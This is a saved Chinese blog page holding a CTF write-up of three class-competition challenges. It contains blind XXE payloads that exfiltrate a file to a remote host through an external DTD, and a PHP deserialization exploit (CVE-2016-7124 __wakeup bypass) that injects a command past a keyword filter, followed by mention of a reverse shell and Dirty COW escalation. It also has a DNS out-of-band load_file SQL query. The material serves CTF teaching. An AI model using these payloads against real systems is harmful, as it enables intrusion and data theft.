@@ -1,0 +1,297 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>小记班级对抗赛 - l3m0n - 博客园</title>
+<link href="./小记班级对抗赛 - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./小记班级对抗赛 - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./小记班级对抗赛 - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./小记班级对抗赛 - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./小记班级对抗赛 - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./小记班级对抗赛 - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./小记班级对抗赛 - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./小记班级对抗赛 - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./小记班级对抗赛 - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./小记班级对抗赛 - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./小记班级对抗赛 - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/ctf-writeup.html" id="cb_post_title_url">小记班级对抗赛</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><h3 id="xxe">xxe</h3>
+<p>出的有点小脑洞，指定了具体到xml位置，还指定了具体对显示位，这样的盲测就有点头大。＝。＝</p>
+<pre><code>&lt;?php require_once('header.php'); ?&gt;
+
+&lt;?php
+if(isset($_POST["submit"])) {
+    $target_file = getcwd()."/upload/".md5($_FILES["file"]["tmp_name"]);
+    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
+        try {
+            $result = @file_get_contents("zip://".$target_file."#docProps/core.xml");
+            $xml = new SimpleXMLElement($result, LIBXML_NOENT);
+            $xml-&gt;registerXPathNamespace("dc", "http://purl.org/dc/elements/1.1/");
+            foreach($xml-&gt;xpath('//dc:title') as $title){
+                echo "&lt;div class=\"uk-alert uk-alert-success\"&gt;&lt;p&gt;It look likes '".$title . "' ! So HuaJi !&lt;/p&gt;&lt;/div&gt;";
+            }
+        } catch (Exception $e){
+            echo "&lt;div class=\"uk-alert uk-alert-warning\"&gt;&lt;p&gt;wrong file!&lt;/p&gt;&lt;/div&gt;";
+        }
+    } else {
+        echo "&lt;div class=\"uk-alert uk-alert-danger\"&gt;&lt;p&gt;error!&lt;/p&gt;&lt;/div&gt;";
+    }
+}
+?&gt;
+
+&lt;!-- allowed: jpg | png | gif | doc | docx --&gt;
+&lt;!-- root@z0z:/tmp# ls -la
+     drwxr-xr-x  2 root root 4096 Nov 16 15:00 FlAg --&gt;</code></pre>
+<p>此题解法不说了，说说盲xxe的情况下如何获取数据。</p>
+<p>xxe漏洞在这篇文章已经总结的很详细了：<a class="uri" href="http://www.waitalone.cn/xxe-attack.html">http://www.waitalone.cn/xxe-attack.html</a></p>
+<p>盲xxe的话，先测试能否远程</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % remote SYSTEM "http://ip/xxe_testa"&gt;
+%remote;]&gt;
+&lt;root/&gt;</code></pre>
+<p>再实施具体获取数据攻击：</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/tmp/FlAg"&gt;
+&lt;!ENTITY % dtd SYSTEM "http://ip/ee.xml"&gt;
+%dtd;
+%send;
+]&gt;</code></pre>
+<p>远程的ee.xml</p>
+<pre><code>&lt;!ENTITY % all "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://ip/a=%file;'&gt;"&gt;
+%all;</code></pre>
+<p>这样在远程的log会有一个纪录。</p>
+<h3 id="序列化">序列化</h3>
+<pre><code>&lt;!--
+class flag{
+    private $session_start = 0;
+    private $information = 0;
+    private $D0g3 = array();
+
+    public function __construct ($session_start, $information, $D0g3)
+    {
+        $this-&gt;session_start = $session_start;
+        $this-&gt;information = $information;
+        $this-&gt;D0g3 = $D0g3;
+    }
+
+    function __destruct ()
+    {
+        // TODO: Implement __destruct() method.
+        if ($this-&gt;session_start != '' &amp;&amp; $this-&gt;information != '' &amp;&amp; $this-&gt;D0g3 != '')
+        {
+            $this-&gt;check_session();
+            $_SESSION['poc1'] = $this-&gt;D0g3[0];
+            $_SESSION['poc2'] = $this-&gt;D0g3[1];
+            include "php2.php";
+        }
+        else
+        {
+            die("Read PHP Code Carefully!");
+        }
+    }
+
+    function __wakeup ()
+    {
+        // TODO: Implement __wakeup() method.
+        foreach (get_object_vars($this) as $k =&gt; $v)
+        {
+            $this-&gt;$k = null;
+        }
+        die("Working up....\n");
+    }
+    public function check_session()
+    {
+        $a = @(float)$this-&gt;session_start;
+        $check = 1;
+        $b = array("false", "true");
+        $c = "";
+        if (!isset($a)){
+            die ("error");
+        }
+        if ($a == $check)
+        {
+            die("false");
+        }
+        else
+        {
+            $c = $b[$a];
+        }
+        return $_SESSION['flag1'] = $c;
+    }
+}
+session_start();
+$poc = $_POST['poc'];
+$a = unserialize($poc);
+--&gt;</code></pre>
+<p>这段主要是要绕过__wakeup和check_session，这里session_start用1.234E就可以了，这样<span class="math inline">\(_SESSION['flag1']可以为true，然后\)</span>a == $check的时候为false。最后__wakeup利用修改属性值就可以绕过。</p>
+<pre><code>session_start();
+$url = $_SERVER['PHP_SELF'];
+if (strstr($url, "flag1.php")) {
+    die("fool!");
+}
+if ($_SESSION['flag1']) {
+    print "D0g3{CVE-2016-7124_is_fun!!!}";
+    unset($_SESSION['flag1']);
+}
+$id = $_SESSION['poc1'];
+$waf = array('system', 'exec', 'shell_exec', 'passthru', '`');
+$id = str_replace($waf, '', $id);
+echo $id . "&lt;br /&gt;";
+$q = 'echo' . $id . 'is' . $a . ";";
+$sy = create_function('$a', $q);</code></pre>
+<p>这个是过滤字符为空，然后最后是要利用create_function，所以可以构造exp：</p>
+<pre><code>class flag {
+    private $session_start = 0;
+    private $information = 0;
+    private $D0g3 = array();
+
+    public function __construct() {
+        $this-&gt;session_start = "1.234E";
+        $this-&gt;information = "aaaa";
+        $this-&gt;D0g3 = array("1;}syssystemtem('python\${IFS}/tmp/2.py');/*", "2");
+    }
+}
+$t = new flag;
+echo urlencode(serialize($t));</code></pre>
+<p>然后就可以反弹一个shell，利用脏牛提权。</p>
+<h3 id="dns注入">dns注入</h3>
+<p>此题有两个地址，第一个是一个dns服务器，然后上面有一个httpproxy服务(可命令执行)，第二个是一个web服务，本来的考点是通过dns出数据，然后命令执行获取dns的log纪录。但是由于，sleep等函数过滤的时候没考虑大小写可以导致直接注入flag。</p>
+<p><img src="./小记班级对抗赛 - l3m0n - 博客园/804631-20161121012545862-87820089.png"/></p>
+<p>可以找到，然后可以通过select load_file(concat('\\\',select(1),'c1tas.com\abc'))这样的出数据。</p>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2016-11-21 01:27</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6084141" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6084141);return false;">收藏</a></div>
+</div>
+<script src="./小记班级对抗赛 - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6084141,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2016/11/21 1:27:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./小记班级对抗赛 - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./小记班级对抗赛 - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./小记班级对抗赛 - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
